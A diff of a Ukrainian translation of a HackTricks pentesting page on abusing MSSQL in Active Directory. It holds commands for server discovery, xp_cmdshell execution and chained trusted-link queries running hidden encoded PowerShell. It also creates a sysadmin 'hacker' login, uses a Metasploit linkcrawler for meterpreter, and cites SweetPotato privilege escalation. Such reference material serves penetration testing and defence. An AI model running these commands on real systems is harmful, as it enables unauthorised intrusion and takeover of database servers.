@@ -1,24 +1,31 @@
-# Зловживання MSSQL AD
+# MSSQL AD Зловживання
+
+{% hint style="success" %}
+Вивчайте та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-* Ви працюєте в **кібербезпеці компанії**? Хочете побачити вашу **компанію в рекламі на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
+{% endhint %}
 
-## **Перелік / Відкриття MSSQL**
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
-Модуль PowerShell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) дуже корисний у цьому випадку.
+{% embed url="https://websec.nl/" %}
+
+## **Перерахунок / Виявлення MSSQL**
+
+Модуль powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) є дуже корисним у цьому випадку.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
-### Перелік з мережі без сесії домену
+### Перерахунок з мережі без доменної сесії
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -32,7 +39,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Перелік зсередини домену
+### Перерахунок зсередини домену
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -51,9 +58,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## Зловживання MSSQL
+## MSSQL Основне Зловживання
 
-### Доступ до бази даних
+### Доступ до БД
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -67,22 +74,24 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Можливо також виконати **команди** всередині хоста MSSQL
+Можливо також **виконувати команди** всередині хоста MSSQL
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-### Основні хитрощі взлому MSSQL
+Check in the page mentioned in the **наступному розділі, як зробити це вручну.**
+
+### MSSQL Основні Хакерські Трюки
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## Довірчі посилання MSSQL
+## MSSQL Довірені Посилання
 
-Якщо екземпляр MSSQL є довіреним (посилання бази даних) іншим екземпляром MSSQL. Якщо користувач має привілеї над довіреною базою даних, він зможе **використовувати довірчі відносини для виконання запитів також в іншому екземплярі**. Ці довіри можуть бути ланцюжковими, і на певному етапі користувач може знайти деяку неправильно сконфігуровану базу даних, де він може виконувати команди.
+Якщо екземпляр MSSQL є довіреним (посилання на базу даних) іншим екземпляром MSSQL. Якщо у користувача є привілеї над довіреною базою даних, він зможе **використовувати довірчі відносини для виконання запитів також в іншому екземплярі**. Ці довіри можуть бути з'єднані, і в якийсь момент користувач може знайти неправильно налаштовану базу даних, де він може виконувати команди.
 
-**Посилання між базами даних працюють навіть через довірчі відносини між лісами.**
+**Посилання між базами даних працюють навіть через довіри лісу.**
 
 ### Зловживання Powershell
 ```powershell
@@ -118,44 +127,44 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Ви можете легко перевірити довірені посилання за допомогою Metasploit.
+Ви можете легко перевірити наявність довірених посилань, використовуючи metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Зверніть увагу, що metasploit спробує використовувати лише функцію `openquery()` в MSSQL (таким чином, якщо ви не можете виконати команду за допомогою `openquery()`, вам потрібно спробувати метод `EXECUTE` **вручну** для виконання команд, див. докладніше нижче.)
+Зверніть увагу, що metasploit намагатиметься зловживати лише функцією `openquery()` в MSSQL (отже, якщо ви не можете виконати команду з `openquery()`, вам потрібно буде спробувати метод `EXECUTE` **вручну** для виконання команд, див. нижче.)
 
 ### Вручну - Openquery()
 
-З **Linux** ви можете отримати оболонку консолі MSSQL за допомогою **sqsh** та **mssqlclient.py.**
+З **Linux** ви можете отримати консольну оболонку MSSQL за допомогою **sqsh** та **mssqlclient.py.**
 
-З **Windows** ви також можете знайти посилання та виконувати команди вручну, використовуючи **клієнт MSSQL, наприклад** [**HeidiSQL**](https://www.heidisql.com)
+З **Windows** ви також можете знайти посилання та виконати команди вручну, використовуючи **клієнт MSSQL, такий як** [**HeidiSQL**](https://www.heidisql.com)
 
-_Вхід за допомогою аутентифікації Windows:_
+_Увійдіть за допомогою Windows аутентифікації:_
 
-![](<../../.gitbook/assets/image (167) (1).png>) 
+![](<../../.gitbook/assets/image (808).png>)
 
-#### Знайдіть довірчі посилання
+#### Знайти надійні посилання
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../.gitbook/assets/image (168).png>)
+![](<../../.gitbook/assets/image (716).png>)
 
-#### Виконання запитів за допомогою довірливого посилання
+#### Виконати запити в надійному посиланні
 
-Виконайте запити через посилання (приклад: знайдіть більше посилань у новому доступному екземплярі):
+Виконати запити через посилання (приклад: знайти більше посилань у новій доступній інстанції):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Перевірте, де використовуються подвійні та одинарні лапки, це важливо використовувати їх саме так.
+Перевірте, де використовуються подвійні та одинарні лапки, важливо використовувати їх саме так.
 {% endhint %}
 
-![](<../../.gitbook/assets/image (169).png>)
+![](<../../.gitbook/assets/image (643).png>)
 
-Ви можете продовжувати цей ланцюжок довіри вручну завжди.
+Ви можете продовжувати цей ланцюг довірених посилань вічно вручну.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -163,9 +172,9 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Якщо ви не можете виконувати дії, такі як `exec xp_cmdshell` з `openquery()`, спробуйте метод `EXECUTE`.
+Якщо ви не можете виконати дії, такі як `exec xp_cmdshell` з `openquery()`, спробуйте метод `EXECUTE`.
 
-### Інструкція - EXECUTE
+### Ручний - EXECUTE
 
 Ви також можете зловживати довіреними посиланнями, використовуючи `EXECUTE`:
 ```bash
@@ -173,22 +182,29 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Локальне підвищення привілеїв
+## Підвищення локальних привілеїв
 
-**Локальний користувач MSSQL** зазвичай має спеціальний тип привілеїв, що називається **`SeImpersonatePrivilege`**. Це дозволяє обліковому запису "імітувати клієнта після аутентифікації".
+**MSSQL локальний користувач** зазвичай має спеціальний тип привілею, званий **`SeImpersonatePrivilege`**. Це дозволяє обліковому запису "вдаватись за клієнта після аутентифікації".
 
-Стратегія, яку вигадали багато авторів, полягає в тому, щоб змусити службу SYSTEM аутентифікуватися до підробленої або сервісу "людина посередині", який створює зловмисник. Цей підроблений сервіс потім може імітувати службу SYSTEM, поки вона намагається аутентифікуватися.
+Стратегія, яку розробили багато авторів, полягає в тому, щоб змусити службу SYSTEM аутентифікуватись до зловмисної або атаки "людина посередині" служби, яку створює зловмисник. Ця зловмисна служба потім може вдаватися за службу SYSTEM, поки вона намагається аутентифікуватись.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) містить колекцію цих різноманітних технік, які можна виконати за допомогою команди `execute-assembly` Beacon.
+[SweetPotato](https://github.com/CCob/SweetPotato) має колекцію цих різних технік, які можна виконати за допомогою команди `execute-assembly` Beacon.
+
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
+{% hint style="success" %}
+Вчіться та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вчіться та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримати HackTricks</summary>
 
-* Ви працюєте в **кібербезпецівій компанії**? Хочете, щоб ваша **компанія рекламувалася на HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
+{% endhint %}
